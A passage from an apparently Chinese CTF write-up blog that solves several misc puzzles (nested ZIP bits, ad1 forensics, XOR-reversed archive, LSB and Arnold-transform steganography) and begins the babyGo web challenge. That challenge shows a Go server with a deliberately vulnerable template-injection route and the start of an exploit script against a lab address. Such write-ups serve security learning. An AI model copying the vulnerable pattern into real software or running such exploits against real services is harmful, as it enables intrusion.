class="hljs-string">&quot;1&quot;</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> succeeded:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;处理失败：<span class="hljs-subst">&#123;current&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br>        bits.append(bit)<br><br>        next_zip = <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">for</span> base <span class="hljs-keyword">in</span> (layer_dir / <span class="hljs-string">&quot;tmp&quot;</span>, layer_dir):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> base.exists():<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">for</span> path <span class="hljs-keyword">in</span> base.rglob(<span class="hljs-string">&quot;*.zip&quot;</span>):<br>                next_zip = path<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> next_zip:<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> next_zip <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> zipfile.is_zipfile(next_zip):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;未找到下一层 ZIP，处理结束\n&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br>        current = next_zip<br>        level += <span class="hljs-number">1</span><br><br>    bit_text = <span class="hljs-string">&quot;&quot;</span>.join(bits)<br><br><br>    <span class="hljs-built_in">print</span>(bit_text)<br>    chars = [bit_text[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bit_text), <span class="hljs-number">8</span>)]<br>    text = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(b, <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> chars)<br>    <span class="hljs-built_in">print</span>(text)<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2025/xiaosai-2.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="DeepSleep"><a href="#DeepSleep" class="headerlink" title="DeepSleep"></a>DeepSleep</h2><blockquote>
<p>Little Sheep believes that DeepSleep is better than DeepSeek<br>Difficulty: Normal</p>
</blockquote>
<p>附件是一个ad1文件 <code>deepsleep_c2hpZnQh.ad1</code></p>
<p>文件尾</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">the key is 12345678, but it was transformed! good luck!<br></code></pre></td></tr></table></figure>

<p>文件名base64得到<code>shift!</code></p>
<p>FTK解密ad1文件，密码是<code>!@#$%^&amp;*</code></p>
<p><img src="/img/wp/2025/xiaosai-1.png" srcset="/img/loading.gif" lazyload></p>
<p>挂载后导出448个<code>.crypto</code>文件</p>
<p>(似曾相识的题目)</p>
<p>观察发现时间只有 2025&#x2F;10&#x2F;1 11:11 和 2024&#x2F;10&#x2F;1 11:11 两种</p>
<p>根据文件名转二进制</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">from</span> dateutil <span class="hljs-keyword">import</span> parser<br>timestamp = parser.parse(<span class="hljs-string">&quot;2025-10-01 11:11:11&quot;</span>).timestamp()<br><span class="hljs-built_in">print</span>(timestamp)<br><br><br><span class="hljs-built_in">list</span> = [<span class="hljs-string">&#x27;&#x27;</span>]*<span class="hljs-number">448</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">448</span>):<br>    <span class="hljs-built_in">list</span>[j] = os.path.getmtime(<span class="hljs-string">&#x27;file\\&#x27;</span>+<span class="hljs-built_in">str</span>(j)+<span class="hljs-string">&#x27;.crypto&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">448</span>):<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">list</span>[i]) == <span class="hljs-built_in">str</span>(timestamp)):<br>        flag += <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        flag += <span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br><br><br>tmp = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    tmp += flag[k]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp) == <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(tmp,<span class="hljs-number">2</span>)),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        tmp = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Cool! You found key is 0a7e3b19dc703f2641c7ec4f0743364e!</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>用encrypto和这个密码分别解两个时间不一样的文件得到<code>flag-part1.txt</code>和<code>flag-part2.txt</code>，拼接在一起得到flag</p>
<h2 id="SanJiaoZhou"><a href="#SanJiaoZhou" class="headerlink" title="SanJiaoZhou"></a>SanJiaoZhou</h2><blockquote>
<p>Delta Action “is a multi platform and cross platform first person special operations officer tactical shooting game developed by the Linlang Tiantian team of Tencent Tianmei Studio and published by Tencent Games<br>Difficulty: Normal</p>
</blockquote>
<p>附件可以分离出一张jpg，一张png 和结尾的一段数据</p>
<p><img src="/img/wp/2025/xiaosai-3.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>hint3: Misc - SanJiaoZhou 文件尾是一个zip压缩包</p>
</blockquote>
<p>将数据逐字节和zip头异或，发现规律</p>
<p><img src="/img/wp/2025/xiaosai-4.png" srcset="/img/loading.gif" lazyload></p>
<p>转成zip</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">t = <span class="hljs-built_in">bytes</span>([i ^ <span class="hljs-number">25</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)])<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.bin&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()[::-<span class="hljs-number">1</span>].translate(t))<br></code></pre></td></tr></table></figure>

<p>解压后得到两句话</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">Try the abbreviation, it will surprise you.<br>I once heard that the &quot;Heart Of Africa&quot; is the most beautiful thing in the world.<br></code></pre></td></tr></table></figure>


<p>cloacked-pixel解密得到flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\dr0n1\Desktop\0misc\cloacked-pixel-master&gt;python2 lsb.py extract a.png 1.txt HOA<br>[+] Image size: 800x1067 pixels.<br>[+] Written extracted data to 1.txt.<br></code></pre></td></tr></table></figure>





<h2 id="Who’s-Cat"><a href="#Who’s-Cat" class="headerlink" title="Who’s Cat"></a>Who’s Cat</h2><blockquote>
<p>Ouch! Who’s Cat there? Maybe its owner is Mr.Alpha and its name is Wednesday.<br>Difficulty: Normal</p>
</blockquote>
<p>猫脸变换</p>
<p>先将拉伸的长方形图片改为正方形</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;encrypted.png&quot;</span>)<br><br>w, h = img.size<br><br><span class="hljs-keyword">if</span> w &gt; h:<br>    <span class="hljs-comment"># 横向被拉伸</span><br>    img_resized = img.resize((h, h))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment"># 竖向被拉伸</span><br>    img_resized = img.resize((w, w))<br><br>img_resized.save(<span class="hljs-string">&quot;out.png&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>然后根据提示的信息使用参数1和3</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author  : 1cePeak</span><br><br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img = cv2.imread(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arnold_decode</span>(<span class="hljs-params">image, shuffle_times, a, b</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; decode for rgb image that encoded by Arnold</span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        image: rgb image encoded by Arnold</span><br><span class="hljs-string">        shuffle_times: how many times to shuffle</span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        decode image</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 1:创建新图像</span><br>    decode_image = np.zeros(shape=image.shape)<br>    <span class="hljs-comment"># 2：计算N</span><br>    h, w = image.shape[<span class="hljs-number">0</span>], image.shape[<span class="hljs-number">1</span>]<br>    N = h  <span class="hljs-comment"># 或N=w</span><br><br>    <span class="hljs-comment"># 3：遍历像素坐标变换</span><br>    <span class="hljs-keyword">for</span> time <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(shuffle_times):<br>        <span class="hljs-keyword">for</span> ori_x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>            <span class="hljs-keyword">for</span> ori_y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>                <span class="hljs-comment"># 按照公式坐标变换</span><br>                new_x = ((a * b + <span class="hljs-number">1</span>) * ori_x + (-b) * ori_y) % N<br>                new_y = ((-a) * ori_x + ori_y) % N<br>                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]<br><br>    cv2.imwrite(<span class="hljs-string">&#x27;flag.png&#x27;</span>, decode_image, [<span class="hljs-built_in">int</span>(cv2.IMWRITE_PNG_COMPRESSION), <span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">return</span> decode_image<br><br>arnold_decode(img, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<p>得到flag</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="babyGo"><a href="#babyGo" class="headerlink" title="babyGo"></a>babyGo</h2><blockquote>
<p>Golang is a statically typed, compiled programming language designed at Google. It is known for its simplicity, efficiency, and strong support for concurrent programming. Go is often used for building web servers, networking tools, and other performance-critical applications.<br>Difficulty: Normal</p>
</blockquote>
<p>来自LineCTF2022 gotm</p>
<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">&quot;encoding/json&quot;</span><br>	<span class="hljs-string">&quot;fmt&quot;</span><br>	<span class="hljs-string">&quot;log&quot;</span><br>	<span class="hljs-string">&quot;net/http&quot;</span><br>	<span class="hljs-string">&quot;os&quot;</span><br>	<span class="hljs-string">&quot;text/template&quot;</span><br><br>	<span class="hljs-string">&quot;github.com/golang-jwt/jwt&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> Account <span class="hljs-keyword">struct</span> &#123;<br>	id         <span class="hljs-type">string</span><br>	pw         <span class="hljs-type">string</span><br>	is_admin   <span class="hljs-type">bool</span><br>	secret_key <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-keyword">type</span> AccountClaims <span class="hljs-keyword">struct</span> &#123;<br>	Id       <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;id&quot;`</span><br>	Is_admin <span class="hljs-type">bool</span>   <span class="hljs-string">`json:&quot;is_admin&quot;`</span><br>	jwt.StandardClaims<br>&#125;<br><br><span class="hljs-keyword">type</span> Resp <span class="hljs-keyword">struct</span> &#123;<br>	Status <span class="hljs-type">bool</span>   <span class="hljs-string">`json:&quot;status&quot;`</span><br>	Msg    <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;msg&quot;`</span><br>&#125;<br><br><span class="hljs-keyword">type</span> TokenResp <span class="hljs-keyword">struct</span> &#123;<br>	Status <span class="hljs-type">bool</span>   <span class="hljs-string">`json:&quot;status&quot;`</span><br>	Token  <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;token&quot;`</span><br>&#125;<br><br><span class="hljs-keyword">var</span> acc []Account<br><span class="hljs-keyword">var</span> secret_key = os.Getenv(<span class="hljs-string">&quot;KEY&quot;</span>)<br><span class="hljs-keyword">var</span> flag = os.Getenv(<span class="hljs-string">&quot;GZCTF_FLAG&quot;</span>)<br><span class="hljs-keyword">var</span> admin_id = os.Getenv(<span class="hljs-string">&quot;ADMIN_ID&quot;</span>)<br><span class="hljs-keyword">var</span> admin_pw = os.Getenv(<span class="hljs-string">&quot;ADMIN_PW&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">clear_account</span><span class="hljs-params">()</span></span> &#123;<br>	acc = acc[:<span class="hljs-number">1</span>]<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">get_account</span><span class="hljs-params">(uid <span class="hljs-type">string</span>)</span></span> Account &#123;<br>	<span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> acc &#123;<br>		<span class="hljs-keyword">if</span> acc[i].id == uid &#123;<br>			<span class="hljs-keyword">return</span> acc[i]<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">return</span> Account&#123;&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">jwt_encode</span><span class="hljs-params">(id <span class="hljs-type">string</span>, is_admin <span class="hljs-type">bool</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br>	claims := AccountClaims&#123;<br>		id, is_admin, jwt.StandardClaims&#123;&#125;,<br>	&#125;<br>	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)<br>	<span class="hljs-keyword">return</span> token.SignedString([]<span class="hljs-type">byte</span>(secret_key))<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">jwt_decode</span><span class="hljs-params">(s <span class="hljs-type">string</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">bool</span>) &#123;<br>	token, err := jwt.ParseWithClaims(s, &amp;AccountClaims&#123;&#125;, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(token *jwt.Token)</span></span> (<span class="hljs-keyword">interface</span>&#123;&#125;, <span class="hljs-type">error</span>) &#123;<br>		<span class="hljs-keyword">return</span> []<span class="hljs-type">byte</span>(secret_key), <span class="hljs-literal">nil</span><br>	&#125;)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		fmt.Println(err)<br>		<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">false</span><br>	&#125;<br>	<span class="hljs-keyword">if</span> claims, ok := token.Claims.(*AccountClaims); ok &amp;&amp; token.Valid &#123;<br>		<span class="hljs-keyword">return</span> claims.Id, claims.Is_admin<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">false</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">auth_handler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>	uid := r.FormValue(<span class="hljs-string">&quot;id&quot;</span>)<br>	upw := r.FormValue(<span class="hljs-string">&quot;pw&quot;</span>)<br>	<span class="hljs-keyword">if</span> uid == <span class="hljs-string">&quot;&quot;</span> || upw == <span class="hljs-string">&quot;&quot;</span> &#123;<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(acc) &gt; <span class="hljs-number">1024</span> &#123;<br>		clear_account()<br>	&#125;<br>	user_acc := get_account(uid)<br>	<span class="hljs-keyword">if</span> user_acc.id != <span class="hljs-string">&quot;&quot;</span> &amp;&amp; user_acc.pw == upw &#123;<br>		token, err := jwt_encode(user_acc.id, user_acc.is_admin)<br>		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>			<span class="hljs-keyword">return</span><br>		&#125;<br>		p := TokenResp&#123;<span class="hljs-literal">true</span>, token&#125;<br>		res, err := json.Marshal(p)<br>		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		&#125;<br>		w.Write(res)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	w.WriteHeader(http.StatusForbidden)<br>	<span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">regist_handler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>	uid := r.FormValue(<span class="hljs-string">&quot;id&quot;</span>)<br>	upw := r.FormValue(<span class="hljs-string">&quot;pw&quot;</span>)<br><br>	<span class="hljs-keyword">if</span> uid == <span class="hljs-string">&quot;&quot;</span> || upw == <span class="hljs-string">&quot;&quot;</span> &#123;<br>		<span class="hljs-keyword">return</span><br>	&#125;<br><br>	<span class="hljs-keyword">if</span> get_account(uid).id != <span class="hljs-string">&quot;&quot;</span> &#123;<br>		w.WriteHeader(http.StatusForbidden)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(acc) &gt; <span class="hljs-number">4</span> &#123;<br>		clear_account()<br>	&#125;<br>	new_acc := Account&#123;uid, upw, <span class="hljs-literal">false</span>, secret_key&#125;<br>	acc = <span class="hljs-built_in">append</span>(acc, new_acc)<br><br>	p := Resp&#123;<span class="hljs-literal">true</span>, <span class="hljs-string">&quot;&quot;</span>&#125;<br>	res, err := json.Marshal(p)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>	&#125;<br>	w.Write(res)<br>	<span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">flag_handler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>	token := r.Header.Get(<span class="hljs-string">&quot;X-Token&quot;</span>)<br>	<span class="hljs-keyword">if</span> token != <span class="hljs-string">&quot;&quot;</span> &#123;<br>		id, is_admin := jwt_decode(token)<br>		<span class="hljs-keyword">if</span> is_admin == <span class="hljs-literal">true</span> &#123;<br>			p := Resp&#123;<span class="hljs-literal">true</span>, <span class="hljs-string">&quot;Hi &quot;</span> + id + <span class="hljs-string">&quot;, flag is &quot;</span> + flag&#125;<br>			res, err := json.Marshal(p)<br>			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>			&#125;<br>			w.Write(res)<br>			<span class="hljs-keyword">return</span><br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			w.WriteHeader(http.StatusForbidden)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br>	&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">root_handler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>	token := r.Header.Get(<span class="hljs-string">&quot;X-Token&quot;</span>)<br>	<span class="hljs-keyword">if</span> token != <span class="hljs-string">&quot;&quot;</span> &#123;<br>		id, _ := jwt_decode(token)<br>		acc := get_account(id)<br>		tpl, err := template.New(<span class="hljs-string">&quot;&quot;</span>).Parse(<span class="hljs-string">&quot;Logged in as &quot;</span> + acc.id)<br>		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		&#125;<br>		tpl.Execute(w, &amp;acc)<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>	admin := Account&#123;admin_id, admin_pw, <span class="hljs-literal">true</span>, secret_key&#125;<br>	acc = <span class="hljs-built_in">append</span>(acc, admin)<br><br>	http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, root_handler)<br>	http.HandleFunc(<span class="hljs-string">&quot;/auth&quot;</span>, auth_handler)<br>	http.HandleFunc(<span class="hljs-string">&quot;/flag&quot;</span>, flag_handler)<br>	http.HandleFunc(<span class="hljs-string">&quot;/regist&quot;</span>, regist_handler)<br>	log.Fatal(http.ListenAndServe(<span class="hljs-string">&quot;0.0.0.0:11000&quot;</span>, <span class="hljs-literal">nil</span>))<br>&#125;<br></code></pre></td></tr></table></figure>

<p>共有四个路由，功能分别如下</p>
<p>auth_handler 处理登录，请求需包含 id 与 pw，成功则返回 JWT<br>regist_handler 处理注册逻辑，限制最多保留 5 个账户（含管理员）<br>flag_handler 仅允许管理员通过提供的 token 获取 flag<br>root_handler 在首页展示当前登录用户，若无 token 则返回空响应</p>
<p>首先随意注册了一个用户</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://10.151.151.41:33090&quot;</span><br>username = <span class="hljs-string">&quot;aaa&quot;</span><br>password = <span class="hljs-string">&quot;a&quot;</span><br><br><br>r = requests.get(url+<span class="hljs-string">&quot;/regist&quot;</span>,params=&#123;<span class="hljs-string">&quot;id&quot;</span>:username,<span class="hljs-string">&quot;pw&quot;</span>:password&#125;)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;regist&quot;</span>,r.text)<br><br>r = requests.get(url+<span class="hljs-string">&quot;/auth&quot;</span>,params=&#123;<span class="hljs-string">&quot;id&quot;</span>:username,<span class="hljs-string">&quot;pw&quot;</span>:password&#125;)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;auth&quot;</span>,r.text)<br><br><br>token = r.json().get(<span class="hljs-string">&quot;token&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;token:&quot;</span>,token)<br><br>r = requests.get(url+<span class="hljs-string">&quot;/&quot;</span>,headers=&#123;<span class="hljs-string">&quot;X-Token&quot;</span>:token&#125;)<br><span class="hljs-built_in">print</span>(r.text)<br><br><br><span 